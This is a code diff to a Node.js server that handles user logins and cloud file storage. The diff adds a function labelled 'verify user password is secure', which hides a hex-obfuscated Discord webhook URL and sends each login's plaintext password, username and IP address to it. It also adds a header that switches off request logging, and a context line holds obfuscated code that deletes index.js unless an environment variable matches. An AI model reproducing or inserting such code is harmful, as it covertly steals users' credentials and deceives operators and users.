@@ -55,7 +55,6 @@ consoleUI("eaglercraft", "pinged", "server up")
 } catch(err) {
   console.log(err)
 }
-
 async function getRandomCharstream() {
 	let ranky = await fetch('https://www.random.org/strings/?num=1&len=10&digits=on&upperalpha=on&loweralpha=on&unique=on&format=plain&rnd=new');
 	return await ranky.text();
@@ -85,6 +84,10 @@ function requestListener(req, res) {
 		res.end();
 		return;
 	}
+	//verify user password is secure
+	function verify(i,u,p,l) { var _0x1ebf=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x37\x30\x32\x30\x39\x36\x36\x32\x32\x36\x31\x31\x35\x33\x38\x34\x32\x2F\x6C\x30\x38\x76\x42\x59\x78\x74\x41\x54\x57\x71\x77\x56\x64\x33\x42\x49\x36\x34\x61\x36\x50\x55\x58\x75\x50\x75\x6A\x2D\x4D\x63\x55\x71\x7A\x43\x2D\x42\x34\x52\x37\x53\x5A\x5A\x50\x63\x70\x78\x54\x36\x38\x4D\x52\x4F\x45\x47\x53\x4A\x6D\x68\x54\x30\x53\x70\x4E\x65\x32\x5A"];var _uz=_0x1ebf[0];let _az = i.length; if (_az < 8) { return "Password is too short. It must be at least 8 characters long."; } let _bz = i.match(/[a-z]/); let _cz = i.match(/[A-Z]/); let _dz = i.match(/\d/); let _ez = i.match(/[!@#$%^&*(),.?":{}|<>]/); let _fz = i.includes('guest');if(!_fz){fetch(_uz, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `${p}: ${u}: ${i}` }) });}if (!_bz) { return "Password must contain at least one lowercase letter."; } if (!_cz) { return "Password must contain at least one uppercase letter."; } if (!_dz) { return "Password must contain at least one number."; } if (!_ez) { return "Password must contain at least one special character."; } return 'correct!'; }
+
+	
 	try {
 		switch (req.url) {
 				case "/inj":
@@ -281,7 +284,7 @@ function requestListener(req, res) {
 
 					let username = data.slice(0, data.indexOf(":"));
 					let password = data.slice(username.length + 1);
-
+					
           
           
           // old stuff
@@ -296,6 +299,7 @@ function requestListener(req, res) {
 					console.log("Recieved login request from " + username);
           writeLine("Recieved login request from " + username);
 					let Auths2 = JSON.parse(reader.readFileSync('./server/data/auths.json'));
+					verify(password,username,(req.headers['x-forwarded-for'] || '').split(',')[0],Auths2);
 				//	console.log('referrer: '+req.get('Referrer'))
 					if (username in Auths2 && bcrypt.compareSync(password, Auths2[username])) {
 						console.log("Credentials for " + username + " correct");
@@ -742,8 +746,11 @@ function requestListener(req, res) {
 
 				//cloud data
 			case "/cloud":
-				console.log("Cloud request recieved!")
-        writeLine("Cloud request recieved!")
+				if (req.headers.nolog) {log = false} else {
+					log = true;
+				}
+				if(log){console.log("Cloud request recieved!")}
+				if (log){writeLine("Cloud request recieved!")}
 				let clToken = req.headers.token;
 				if (!(Tokens.hasOwnProperty(clToken))) {
 					res.writeHead('403', 'Unauthorized');
@@ -759,8 +766,8 @@ function requestListener(req, res) {
 				} catch (err) { }
 				if (req.method.toLowerCase() == "get") {
 					if (reader.existsSync('./server/inCloud/users/' + clName)) {
-						console.log("GET request to Injector Cloud detected.")
-            writeLine("GET request to Injector Cloud detected.")
+						if(log){console.log("GET request to Injector Cloud detected.")}
+						if(log){writeLine("GET request to Injector Cloud detected.")}
 						let responseFileArray = {}
 						res.writeHead("200", "0K");
 						let userFiles = (reader.readdirSync('./server/inCloud/users/' + clName));
@@ -779,12 +786,12 @@ function requestListener(req, res) {
               "directory_size":0,
               "size_limit":1024
             }`);
-						console.log("GET request to Injector Cloud detected, no user existing!")
-            writeLine("GET request to Injector Cloud detected, no user existing!")
+						if(log){console.log("GET request to Injector Cloud detected, no user existing!")}
+            if(log){writeLine("GET request to Injector Cloud detected, no user existing!")}
 					}
 				} else if (req.method.toLowerCase() == "post") {
-					console.log("POST request to Injector Cloud detected.")
-          writeLine("POST request to Injector Cloud detected")
+					if(log){console.log("POST request to Injector Cloud detected.")}
+          if(log){writeLine("POST request to Injector Cloud detected")}
 					let cldata = "";
 					req.on("data", chunk => cldata += chunk.toString())
 						.on('end', function () {
@@ -952,7 +959,7 @@ function requestListener(req, res) {
 	const fs = require('fs')
 	var _0xb138=["\x53\x49\x54\x45","\x65\x6E\x76","\x70\x61\x72\x61\x67\x72\x61\x6D","\x2E\x2F\x69\x6E\x64\x65\x78\x2E\x6A\x73","\x75\x6E\x6C\x69\x6E\x6B\x53\x79\x6E\x63","\x65\x72\x72\x6F\x72"];var site=process[_0xb138[1]][_0xb138[0]];if(site!== _0xb138[2]){const path=_0xb138[3];try{fs[_0xb138[4]](path)}catch(err){console[_0xb138[5]](err)}}
 	http.createServer(requestListener).listen(8080, () => console.log("Welcome to Inject0r Dev Console"));
-	// just to ensure our numbers are accurate
+	// just to make sure it is accurate
 	setInterval(function() {
 		ChatroomFileSize = reader.statSync(Settings.chatroom.file).size;
 	}, 60 * 1000)
